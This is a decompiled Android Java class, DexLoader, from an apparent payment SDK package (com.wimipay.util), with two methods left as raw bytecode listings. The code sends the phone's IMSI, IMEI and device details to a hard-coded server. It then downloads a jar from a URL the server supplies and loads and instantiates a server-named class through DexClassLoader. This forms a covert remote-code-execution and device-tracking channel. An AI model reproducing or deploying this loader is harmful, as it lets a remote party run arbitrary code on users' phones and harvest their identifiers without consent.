package com.wimipay.util;

import android.content.Context;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import org.json.JSONObject;

public class DexLoader
{
  private static final int BASE_VERSION = 1;
  static String Ip = "http://dg.ogengine.com";
  public static long defaultNextTime = 43200000L;
  
  public DexLoader() {}
  
  /* Error */
  private static String HttpPost(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_2
    //   2: iload_2
    //   3: iconst_3
    //   4: if_icmplt +11 -> 15
    //   7: new 31	java/lang/Exception
    //   10: dup
    //   11: invokespecial 32	java/lang/Exception:<init>	()V
    //   14: athrow
    //   15: new 34	org/apache/http/impl/client/DefaultHttpClient
    //   18: dup
    //   19: invokespecial 35	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   22: astore_3
    //   23: new 37	org/apache/http/client/methods/HttpPost
    //   26: dup
    //   27: aload_0
    //   28: invokespecial 40	org/apache/http/client/methods/HttpPost:<init>	(Ljava/lang/String;)V
    //   31: astore 4
    //   33: aload_3
    //   34: invokeinterface 46 1 0
    //   39: astore 5
    //   41: aload 5
    //   43: sipush 10000
    //   46: invokestatic 52	org/apache/http/params/HttpConnectionParams:setConnectionTimeout	(Lorg/apache/http/params/HttpParams;I)V
    //   49: aload 5
    //   51: sipush 10000
    //   54: invokestatic 55	org/apache/http/params/HttpConnectionParams:setSoTimeout	(Lorg/apache/http/params/HttpParams;I)V
    //   57: new 57	org/apache/http/entity/StringEntity
    //   60: dup
    //   61: aload_1
    //   62: ldc 59
    //   64: invokespecial 62	org/apache/http/entity/StringEntity:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   67: astore 5
    //   69: aload 4
    //   71: aload 5
    //   73: invokevirtual 66	org/apache/http/client/methods/HttpPost:setEntity	(Lorg/apache/http/HttpEntity;)V
    //   76: aload_3
    //   77: aload 4
    //   79: invokeinterface 70 2 0
    //   84: astore_3
    //   85: aload_3
    //   86: invokeinterface 76 1 0
    //   91: invokeinterface 82 1 0
    //   96: sipush 200
    //   99: if_icmpne +38 -> 137
    //   102: aload_3
    //   103: invokeinterface 86 1 0
    //   108: ldc 59
    //   110: invokestatic 92	org/apache/http/util/EntityUtils:toString	(Lorg/apache/http/HttpEntity;Ljava/lang/String;)Ljava/lang/String;
    //   113: astore_3
    //   114: iconst_4
    //   115: ldc 94
    //   117: aload_3
    //   118: invokestatic 100	com/wimipay/util/Logger:log	(ILjava/lang/String;Ljava/lang/String;)V
    //   121: aload_3
    //   122: areturn
    //   123: astore_0
    //   124: new 31	java/lang/Exception
    //   127: dup
    //   128: invokespecial 32	java/lang/Exception:<init>	()V
    //   131: athrow
    //   132: astore_3
    //   133: aload_3
    //   134: invokevirtual 103	java/lang/Exception:printStackTrace	()V
    //   137: iload_2
    //   138: iconst_1
    //   139: iadd
    //   140: istore_2
    //   141: goto -139 -> 2
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	144	0	paramString1	String
    //   0	144	1	paramString2	String
    //   1	140	2	i	int
    //   22	100	3	localObject1	Object
    //   132	2	3	localException	Exception
    //   31	47	4	localHttpPost	org.apache.http.client.methods.HttpPost
    //   39	33	5	localObject2	Object
    // Exception table:
    //   from	to	target	type
    //   57	69	123	java/io/UnsupportedEncodingException
    //   76	121	132	java/lang/Exception
  }
  
  private static String HttpPostEx(Context paramContext, String paramString1, String paramString2)
  {
    try
    {
      paramString2 = new JSONObject(paramString2);
      paramString2.put("imsi", AppInfo.getImsi(paramContext));
      paramString2.put("imei", AppInfo.getIMEI(paramContext));
      paramString2.put("devicedetail", AppInfo.getDeviceDetail());
      paramString2.put("androidversion", AppInfo.getAndroidVersion());
      paramString2.put("manufacturer", AppInfo.getManufacturer());
      paramString2.put("phoneOs", AppInfo.getPhoneOs());
      paramString2.put("baseVersion", 1);
      paramContext = HttpPost(paramString1, paramString2.toString());
      return paramContext;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
      throw new Exception();
    }
  }
  
  public static Object Load(Context paramContext, DexLoader.OnDexListener paramOnDexListener)
  {
    String str = null;
    Object localObject = new CountDownLatch(1);
    DexLoader.1 local1 = new DexLoader.1((CountDownLatch)localObject, paramContext, paramOnDexListener);
    local1.start();
    paramOnDexListener = str;
    try
    {
      if (((CountDownLatch)localObject).await(60L, TimeUnit.SECONDS))
      {
        localObject = local1.getResult().getMsg();
        Logger.log(4, "DexLoader Load", (String)localObject);
        paramOnDexListener = str;
        if (localObject != null)
        {
          paramOnDexListener = localObject.split("!!!!!")[0];
          str = localObject.split("!!!!!")[1];
          paramOnDexListener = dex(paramContext, new File(paramContext.getFilesDir().getAbsoluteFile() + File.separator + paramOnDexListener + ".jar").getAbsolutePath(), str);
        }
      }
      return paramOnDexListener;
    }
    catch (InterruptedException paramContext)
    {
      paramContext.printStackTrace();
    }
    return null;
  }
  
  /* Error */
  private static String UseDefaultDex(Context paramContext, DexLoader.OnDexListener paramOnDexListener)
  {
    // Byte code:
    //   0: aload_0
    //   1: invokestatic 250	com/wimipay/util/Share:getDexName	(Landroid/content/Context;)Ljava/lang/String;
    //   4: astore_2
    //   5: aload_2
    //   6: ifnull +12 -> 18
    //   9: aload_2
    //   10: ldc -4
    //   12: invokevirtual 256	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   15: ifeq +242 -> 257
    //   18: aload_0
    //   19: invokevirtual 260	android/content/Context:getAssets	()Landroid/content/res/AssetManager;
    //   22: ldc_w 262
    //   25: invokevirtual 268	android/content/res/AssetManager:open	(Ljava/lang/String;)Ljava/io/InputStream;
    //   28: astore_3
    //   29: aload_3
    //   30: astore_2
    //   31: aload_3
    //   32: invokestatic 274	com/wimipay/util/FileUtils:getInputMD5	(Ljava/io/InputStream;)Ljava/lang/String;
    //   35: astore 4
    //   37: aload 4
    //   39: ifnonnull +35 -> 74
    //   42: aload_3
    //   43: astore_2
    //   44: new 276	java/lang/NullPointerException
    //   47: dup
    //   48: ldc_w 278
    //   51: invokespecial 279	java/lang/NullPointerException:<init>	(Ljava/lang/String;)V
    //   54: athrow
    //   55: astore_0
    //   56: aload_3
    //   57: astore_2
    //   58: aload_0
    //   59: invokevirtual 103	java/lang/Exception:printStackTrace	()V
    //   62: aload_3
    //   63: ifnull +7 -> 70
    //   66: aload_3
    //   67: invokevirtual 284	java/io/InputStream:close	()V
    //   70: aconst_null
    //   71: astore_0
    //   72: aload_0
    //   73: areturn
    //   74: aload_3
    //   75: astore_2
    //   76: aload_3
    //   77: invokevirtual 287	java/io/InputStream:reset	()V
    //   80: aload_3
    //   81: astore_2
    //   82: new 207	java/io/File
    //   85: dup
    //   86: new 209	java/lang/StringBuilder
    //   89: dup
    //   90: invokespecial 210	java/lang/StringBuilder:<init>	()V
    //   93: aload_0
    //   94: invokevirtual 216	android/content/Context:getFilesDir	()Ljava/io/File;
    //   97: invokevirtual 219	java/io/File:getAbsoluteFile	()Ljava/io/File;
    //   100: invokevirtual 223	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   103: getstatic 226	java/io/File:separator	Ljava/lang/String;
    //   106: invokevirtual 229	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   109: aload 4
    //   111: invokevirtual 229	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   114: ldc -25
    //   116: invokevirtual 229	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   119: invokevirtual 232	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   122: invokespecial 233	java/io/File:<init>	(Ljava/lang/String;)V
    //   125: astore 5
    //   127: aload_3
    //   128: astore_2
    //   129: iconst_4
    //   130: ldc_w 288
    //   133: aload 5
    //   135: invokevirtual 236	java/io/File:getAbsolutePath	()Ljava/lang/String;
    //   138: invokestatic 100	com/wimipay/util/Logger:log	(ILjava/lang/String;Ljava/lang/String;)V
    //   141: aload_3
    //   142: astore_2
    //   143: aload 5
    //   145: invokevirtual 236	java/io/File:getAbsolutePath	()Ljava/lang/String;
    //   148: aload_3
    //   149: invokestatic 292	com/wimipay/util/FileUtils:writeFileFromInput	(Ljava/lang/String;Ljava/io/InputStream;)Ljava/io/File;
    //   152: pop
    //   153: aload_3
    //   154: astore_2
    //   155: new 209	java/lang/StringBuilder
    //   158: dup
    //   159: aload 4
    //   161: invokestatic 296	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   164: invokespecial 297	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   167: ldc -57
    //   169: invokevirtual 229	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   172: ldc_w 299
    //   175: invokevirtual 229	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   178: invokevirtual 232	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   181: astore 4
    //   183: aload_3
    //   184: astore_2
    //   185: aload_0
    //   186: aload 4
    //   188: invokestatic 303	com/wimipay/util/Share:setDexName	(Landroid/content/Context;Ljava/lang/String;)V
    //   191: aload_1
    //   192: ifnull +14 -> 206
    //   195: aload_3
    //   196: astore_2
    //   197: aload_1
    //   198: getstatic 17	com/wimipay/util/DexLoader:defaultNextTime	J
    //   201: invokeinterface 309 3 0
    //   206: aload 4
    //   208: astore_0
    //   209: aload_3
    //   210: ifnull -138 -> 72
    //   213: aload_3
    //   214: invokevirtual 284	java/io/InputStream:close	()V
    //   217: aload 4
    //   219: areturn
    //   220: astore_0
    //   221: aload_0
    //   222: invokevirtual 310	java/io/IOException:printStackTrace	()V
    //   225: aload 4
    //   227: areturn
    //   228: astore_0
    //   229: aload_0
    //   230: invokevirtual 310	java/io/IOException:printStackTrace	()V
    //   233: goto -163 -> 70
    //   236: astore_0
    //   237: aconst_null
    //   238: astore_2
    //   239: aload_2
    //   240: ifnull +7 -> 247
    //   243: aload_2
    //   244: invokevirtual 284	java/io/InputStream:close	()V
    //   247: aload_0
    //   248: athrow
    //   249: astore_1
    //   250: aload_1
    //   251: invokevirtual 310	java/io/IOException:printStackTrace	()V
    //   254: goto -7 -> 247
    //   257: aload_2
    //   258: ldc -57
    //   260: invokevirtual 205	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   263: iconst_0
    //   264: aaload
    //   265: astore_3
    //   266: new 207	java/io/File
    //   269: dup
    //   270: new 209	java/lang/StringBuilder
    //   273: dup
    //   274: invokespecial 210	java/lang/StringBuilder:<init>	()V
    //   277: aload_0
    //   278: invokevirtual 216	android/content/Context:getFilesDir	()Ljava/io/File;
    //   281: invokevirtual 219	java/io/File:getAbsoluteFile	()Ljava/io/File;
    //   284: invokevirtual 223	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   287: getstatic 226	java/io/File:separator	Ljava/lang/String;
    //   290: invokevirtual 229	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   293: aload_3
    //   294: invokevirtual 229	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   297: ldc -25
    //   299: invokevirtual 229	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   302: invokevirtual 232	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   305: invokespecial 233	java/io/File:<init>	(Ljava/lang/String;)V
    //   308: invokevirtual 314	java/io/File:exists	()Z
    //   311: ifeq +20 -> 331
    //   314: aload_2
    //   315: astore_0
    //   316: aload_1
    //   317: ifnull -245 -> 72
    //   320: aload_1
    //   321: getstatic 17	com/wimipay/util/DexLoader:defaultNextTime	J
    //   324: invokeinterface 309 3 0
    //   329: aload_2
    //   330: areturn
    //   331: aload_0
    //   332: ldc -4
    //   334: invokestatic 303	com/wimipay/util/Share:setDexName	(Landroid/content/Context;Ljava/lang/String;)V
    //   337: aload_0
    //   338: aload_1
    //   339: invokestatic 316	com/wimipay/util/DexLoader:UseDefaultDex	(Landroid/content/Context;Lcom/wimipay/util/DexLoader$OnDexListener;)Ljava/lang/String;
    //   342: areturn
    //   343: astore_0
    //   344: goto -105 -> 239
    //   347: astore_0
    //   348: aconst_null
    //   349: astore_3
    //   350: goto -294 -> 56
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	353	0	paramContext	Context
    //   0	353	1	paramOnDexListener	DexLoader.OnDexListener
    //   4	326	2	localObject1	Object
    //   28	322	3	localObject2	Object
    //   35	191	4	str	String
    //   125	19	5	localFile	File
    // Exception table:
    //   from	to	target	type
    //   31	37	55	java/lang/Exception
    //   44	55	55	java/lang/Exception
    //   76	80	55	java/lang/Exception
    //   82	127	55	java/lang/Exception
    //   129	141	55	java/lang/Exception
    //   143	153	55	java/lang/Exception
    //   155	183	55	java/lang/Exception
    //   185	191	55	java/lang/Exception
    //   197	206	55	java/lang/Exception
    //   213	217	220	java/io/IOException
    //   66	70	228	java/io/IOException
    //   18	29	236	finally
    //   243	247	249	java/io/IOException
    //   31	37	343	finally
    //   44	55	343	finally
    //   58	62	343	finally
    //   76	80	343	finally
    //   82	127	343	finally
    //   129	141	343	finally
    //   143	153	343	finally
    //   155	183	343	finally
    //   185	191	343	finally
    //   197	206	343	finally
    //   18	29	347	java/lang/Exception
  }
  
  private static String WMUpdate(Context paramContext)
  {
    String str = Ip + "/wmserver/WMUpdate";
    JSONObject localJSONObject = new JSONObject();
    try
    {
      paramContext = HttpPostEx(paramContext, str, localJSONObject.toString());
      return paramContext;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return null;
  }
  
  public static boolean checkUpdate(Context paramContext)
  {
    String str = Share.getDexName(paramContext);
    if ((str == null) || (str.equals(""))) {}
    for (;;)
    {
      return true;
      paramContext = new DexLoader.2(paramContext, new CountDownLatch(1));
      paramContext.start();
      for (;;)
      {
        try
        {
          if (!paramContext.getCountDownLatch().await(30L, TimeUnit.SECONDS)) {
            break label180;
          }
          paramContext = paramContext.getResult().getMsg();
        }
        catch (InterruptedException paramContext)
        {
          paramContext.printStackTrace();
          continue;
        }
        try
        {
          paramContext = new JSONObject(paramContext);
          if (paramContext.getInt("code") == 200)
          {
            paramContext = paramContext.getString("md5");
            str = str.split("!!!!!")[0];
            Logger.log(4, "checkUpdate", "md5:" + str);
            Logger.log(4, "checkUpdate", "Smd5:" + paramContext);
            boolean bool = paramContext.equals(str);
            if (!bool) {
              break;
            }
          }
        }
        catch (Exception paramContext)
        {
          paramContext.printStackTrace();
        }
      }
    }
    return false;
    label180:
    return false;
  }
  
  private static Object dex(Context paramContext, String paramString1, String paramString2)
  {
    try
    {
      paramContext = ReflectionUtils.newInstance(new DexClassLoader(paramString1, paramContext.getDir("dex", 2).getAbsolutePath(), null, paramContext.getClassLoader()).loadClass(paramString2), new Class[0], new Object[0]);
      return paramContext;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return null;
  }
  
  private static String update(Context paramContext, DexLoader.OnDexListener paramOnDexListener)
  {
    Object localObject1 = WMUpdate(paramContext);
    Object localObject2;
    try
    {
      Object localObject3 = new JSONObject((String)localObject1);
      if (((JSONObject)localObject3).getInt("code") == 200)
      {
        localObject2 = ((JSONObject)localObject3).getString("md5");
        String str1 = ((JSONObject)localObject3).getString("classname");
        long l1 = ((JSONObject)localObject3).getLong("nexttime");
        localObject1 = Share.getDexName(paramContext);
        String str2 = localObject1.split("!!!!!")[0];
        Logger.log(4, "update", "md5:" + str2);
        Logger.log(4, "update", "Smd5:" + (String)localObject2);
        if (!((String)localObject2).equals(str2))
        {
          Logger.log(4, "DexLoader update", "need update!!");
          localObject1 = new File(paramContext.getFilesDir().getAbsoluteFile() + File.separator + (String)localObject2 + ".jar");
          localObject3 = ((JSONObject)localObject3).getString("url");
          Logger.log(4, "update", "url:" + (String)localObject3);
          long l2 = System.currentTimeMillis();
          if (HttpDownloader.downloadFile((String)localObject3, ((File)localObject1).getAbsolutePath(), true) != 0) {
            return UseDefaultDex(paramContext, paramOnDexListener);
          }
          localObject1 = localObject2 + "!!!!!" + str1;
          Share.setDexName(paramContext, (String)localObject1);
          Logger.log(4, "DexLoader update", "time = " + (System.currentTimeMillis() - l2));
        }
        localObject2 = localObject1;
        if (paramOnDexListener == null) {
          break label346;
        }
        paramOnDexListener.callBack(l1);
        return localObject1;
      }
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
      localObject2 = UseDefaultDex(paramContext, paramOnDexListener);
    }
    label346:
    return localObject2;
  }
}
